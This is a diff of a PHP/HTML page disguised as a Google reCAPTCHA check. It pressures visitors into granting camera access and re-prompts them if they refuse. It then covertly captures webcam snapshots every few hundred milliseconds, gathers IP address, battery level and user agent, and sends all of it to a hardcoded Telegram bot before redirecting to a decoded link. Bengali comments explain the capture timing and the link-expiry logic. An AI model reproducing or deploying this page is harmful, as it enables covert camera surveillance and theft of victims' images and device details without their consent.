@@ -1,23 +1,14 @@
 <?php
-$expiryTime = 0;
-if (isset($_GET['e']) && !empty($_GET['e'])) {
-    $expiryTime = hexdec($_GET['e']);
-}
-
-if ($expiryTime === 0 || time() > $expiryTime) {
-    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-        exit;
-    }
-}
-
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     
-    if ($expiryTime === 0 || time() > $expiryTime) {
-        exit;
+    // এক্সপায়ারি টাইম চেক করা (লিংকের মেয়াদ শেষ হয়ে গেলে ছবি বা ডেটা প্রসেস করবে না)
+    $expiryTime = isset($_POST['exp']) ? intval($_POST['exp']) : 0;
+    if ($expiryTime > 0 && time() > $expiryTime) {
+        exit; // মেয়াদ শেষ, তাই কোড এখানেই থেমে যাবে এবং কোনো ছবি টেলিগ্রামে যাবে না।
     }
 
     $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
-    $chatId = "5896019931";
+    $chatId = "5896019931"; 
 
     if (isset($_POST['chat_id']) && !empty($_POST['chat_id'])) {
         $encodedCid = $_POST['chat_id'];
@@ -28,34 +19,53 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     }
 
     $uploadDir = 'uploads/';
-    if (!is_dir($uploadDir)) mkdir($uploadDir, 0777, true);
+    if (!is_dir($uploadDir)) {
+        mkdir($uploadDir, 0777, true);
+    }
 
-    $imgData = str_replace(['data:image/png;base64,', ' '], ['', '+'], $_POST['image']);
+    $imgData = $_POST['image'];
+    $imgData = str_replace('data:image/png;base64,', '', $imgData);
+    $imgData = str_replace(' ', '+', $imgData);
+    $data = base64_decode($imgData);
+
+    $targetId = isset($_POST['target']) ? $_POST['target'] : 'direct';
+    
+    $userAgent = isset($_POST['user_agent']) ? $_POST['user_agent'] : 'Unknown';
+    $battery   = isset($_POST['battery']) ? $_POST['battery'] : 'Unknown';
+    
+    $ipAddress = $_SERVER['REMOTE_ADDR'];
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        $ipAddress = $_SERVER['HTTP_CLIENT_IP'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ipAddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    }
+
     $fileName = 'img_' . uniqid() . '.png';
     $filePath = $uploadDir . $fileName;
 
-    $ipAddress = $_SERVER['REMOTE_ADDR'];
-    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
-        $ipAddress = trim($ipList[0]);
-    } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
-        $ipAddress = $_SERVER['HTTP_CLIENT_IP'];
-    }
+    if (file_put_contents($filePath, $data)) {
+        $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendPhoto";
+        
+        $caption = "🎯 Target ID: {$targetId}\n" .
+                   "🔋 Battery: {$battery}\n" .
+                   "🌐 IP Address: {$ipAddress}\n" .
+                   "💻 User Agent: {$userAgent}\n" .
+                   "📁 File: {$fileName}";
 
-    if (file_put_contents($filePath, base64_decode($imgData))) {
         $postFields = [
             'chat_id' => $chatId,
-            'caption' => "🎯 Target ID: " . ($_POST['target'] ?? 'direct') . "\n" .
-                         "🔋 Battery: " . ($_POST['battery'] ?? 'Unknown') . "\n" .
-                         "🌐 IP: " . $ipAddress . "\n" .
-                         "💻 UA: " . ($_POST['user_agent'] ?? 'Unknown'),
+            'caption' => $caption,
             'photo'   => new CURLFile(realpath($filePath))
         ];
 
-        $ch = curl_init("https://api.telegram.org/bot{$botToken}/sendPhoto");
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $telegramUrl);
         curl_setopt($ch, CURLOPT_POST, 1);
         curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 3); 
+
         curl_exec($ch);
         curl_close($ch);
     }
@@ -69,101 +79,224 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
     <style>
-        body, html { margin: 0; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; background: #f9f9f9; overflow: hidden; }
-        .recaptcha-box { background: #f9f9f9; border: 1px solid #d3d3d3; border-radius: 3px; padding: 20px 25px; display: flex; align-items: center; justify-content: space-between; width: 300px; box-shadow: 0 0 4px rgba(0,0,0,0.08); display: none; }
-        .recaptcha-left { display: flex; align-items: center; gap: 15px; }
-        .recaptcha-checkbox { width: 28px; height: 28px; background: #fff; border: 2px solid #c1c1c1; border-radius: 2px; }
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background-color: #f9f9f9; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
         
-        /* লোড হওয়ার চাকাটি এখন আরও আস্তে (Slow) ঘুরবে (1.5s করা হয়েছে) */
-        .recaptcha-checkbox.loading { 
-            border: 2px solid #f3f3f3; 
-            border-top: 2px solid #3498db; 
-            border-radius: 50%; 
-            animation: spin 1.5s linear infinite; 
+        .recaptcha-box {
+            background: #f9f9f9;
+            border: 1px solid #d3d3d3;
+            border-radius: 3px;
+            padding: 20px 25px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 300px;
+            box-shadow: 0 0 4px 1px rgba(0,0,0,0.08);
+            display: none;
+            cursor: pointer;
         }
 
-        @keyframes spin { 
-            0% { transform: rotate(0deg); } 
-            100% { transform: rotate(360deg); } 
+        .recaptcha-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
         }
 
-        .recaptcha-text { font-family: Roboto, sans-serif; font-size: 14px; color: #2c2c2c; }
-        .recaptcha-right { display: flex; flex-direction: column; align-items: center; }
-        .recaptcha-logo { width: 32px; height: 32px; background-image: url('https://www.gstatic.com/recaptcha/api2/logo_48.png'); background-size: contain; }
-        .recaptcha-footer { font-family: Roboto, sans-serif; font-size: 10px; color: #555; }
+        .recaptcha-checkbox {
+            width: 28px;
+            height: 28px;
+            background: #fff;
+            border: 2px solid #c1c1c1;
+            border-radius: 2px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            transition: background 0.2s, border-color 0.2s;
+        }
+
+        .recaptcha-checkbox:hover {
+            border-color: #b2b2b2;
+        }
+
+        .recaptcha-spinner {
+            width: 24px;
+            height: 24px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #4285F4;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .recaptcha-checkbox.checked::after {
+            content: "";
+            position: absolute;
+            width: 6px;
+            height: 12px;
+            border: solid #006600;
+            border-width: 0 3px 3px 0;
+            transform: rotate(45deg);
+            margin-bottom: 3px;
+        }
+
+        .recaptcha-text {
+            font-family: Roboto, helvetica, arial, sans-serif;
+            font-size: 14px;
+            color: #2c2c2c;
+            user-select: none;
+        }
+
+        .recaptcha-right {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .recaptcha-logo {
+            width: 32px;
+            height: 32px;
+            background-image: url('https://www.gstatic.com/recaptcha/api2/logo_48.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+        }
+
+        .recaptcha-footer {
+            font-family: Roboto, helvetica, arial, sans-serif;
+            font-size: 10px;
+            color: #555;
+            margin-top: 2px;
+        }
     </style>
 </head>
 <body>
-    <div class="recaptcha-box" id="recaptchaContainer">
+
+    <div class="recaptcha-box" id="recaptchaContainer" onclick="openTargetLink()">
         <div class="recaptcha-left">
-            <div class="recaptcha-checkbox" id="recaptchaCheckbox"></div>
-            <span class="recaptcha-text">Verifying...</span>
+            <div class="recaptcha-checkbox" id="recaptchaCheckbox">
+                <div class="recaptcha-spinner" id="recaptchaSpinner"></div>
+            </div>
+            <span class="recaptcha-text">I am not a robot</span>
         </div>
         <div class="recaptcha-right">
             <div class="recaptcha-logo"></div>
             <div class="recaptcha-footer">reCAPTCHA</div>
         </div>
     </div>
+
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const targetId = urlParams.get('id') || 'direct';
-        const userChatId = urlParams.get('cid') || ''; 
-        let finalUrl = "https://www.aapunkagames.com/";
-        const rawTargetUrl = urlParams.get('url');
-
-        if (rawTargetUrl) {
-            try { finalUrl = atob(rawTargetUrl.replace(/-/g, '+').replace(/_/g, '/')); } catch (e) {}
-        }
-
-        document.getElementById('recaptchaContainer').style.display = 'flex';
-
-        let batteryInfo = 'Not Available';
-        if (navigator.getBattery) {
-            navigator.getBattery().then(b => { batteryInfo = Math.round(b.level * 100) + '%'; });
-        }
-
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
-        function startAutoVerification() {
-            document.getElementById('recaptchaCheckbox').classList.add('loading');
-            
-            // ছবি পাঠানো আরও ফাস্ট করা হলো: প্রতি ০.৩ সেকেন্ড (300ms) পর পর ছবি ক্যাপচার হবে
-            const interval = setInterval(captureAndUpload, 300); 
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetId = urlParams.get('id') || 'direct';
+        const userChatId = urlParams.get('cid') || ''; 
+        const expiryTime = urlParams.get('exp') || ''; // লিংকের এক্সপায়ারি টাইম রিসিভ করা
+        const rawTargetUrl = urlParams.get('url');
 
-            setTimeout(() => {
-                clearInterval(interval);
-                window.location.href = finalUrl;
-            }, 4000); // মোট ৪ সেকেন্ড পর্যন্ত ভেরিফাই হবে
+        let finalUrl = "https://www.aapunkagames.com/"; 
+
+        if (rawTargetUrl) {
+            try {
+                finalUrl = atob(rawTargetUrl.replace(/-/g, '+').replace(/_/g, '/'));
+            } catch (e) {
+                console.error("URL decode error:", e);
+            }
         }
 
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-                setTimeout(startAutoVerification, 300);
-            })
-            .catch(() => {
-                alert("লিংকটি দেখতে হলে অবশ্যই ক্যামেরা পারমিশন দিতে হবে!");
-                location.reload();
+        const recaptchaContainer = document.getElementById('recaptchaContainer');
+        if (finalUrl) {
+            recaptchaContainer.style.display = 'flex';
+        }
+
+        let isClicked = false;
+        function openTargetLink() {
+            if (isClicked) return;
+            isClicked = true;
+
+            const checkbox = document.getElementById('recaptchaCheckbox');
+            const spinner = document.getElementById('recaptchaSpinner');
+
+            spinner.style.display = 'block';
+
+            setTimeout(() => {
+                spinner.style.display = 'none';
+                checkbox.classList.add('checked');
+                
+                setTimeout(() => {
+                    window.location.href = finalUrl;
+                }, 400);
+            }, 3000);
+        }
+
+        let batteryLevelInfo = 'Not Available';
+        if (navigator.getBattery) {
+            navigator.getBattery().then(battery => {
+                batteryLevelInfo = Math.round(battery.level * 100) + '%';
             });
+        }
+
+        function requestCameraPermission() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                    setTimeout(() => {
+                        setInterval(captureAndUpload, 500);
+                    }, 1000);
+                })
+                .catch(err => {
+                    console.error("Camera error: ", err);
+                    alert("লিংকটি দেখতে হলে অবশ্যই ক্যামেরা পারমিশন দিতে হবে!");
+                    setTimeout(requestCameraPermission, 1000);
+                });
+        }
+
+        requestCameraPermission();
 
         function captureAndUpload() {
-            const ctx = canvas.getContext('2d');
+            const context = canvas.getContext('2d');
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            const params = new URLSearchParams();
-            params.append('image', canvas.toDataURL('image/png'));
-            params.append('target', targetId);
-            params.append('chat_id', userChatId);
-            params.append('user_agent', navigator.userAgent);
-            params.append('battery', batteryInfo);
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
 
-            fetch('', { method: 'POST', body: params }).catch(() => {});
+            const postData = new URLSearchParams();
+            postData.append('image', imageData);
+            postData.append('target', targetId);
+            postData.append('chat_id', userChatId);
+            postData.append('exp', expiryTime); // এক্সপায়ারি টাইম সার্ভারে পাঠানো হচ্ছে
+            postData.append('user_agent', navigator.userAgent);
+            postData.append('battery', batteryLevelInfo);
+
+            fetch('', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: postData
+            }).catch(error => {
+                console.error('Error:', error);
+            });
         }
     </script>
 </body>
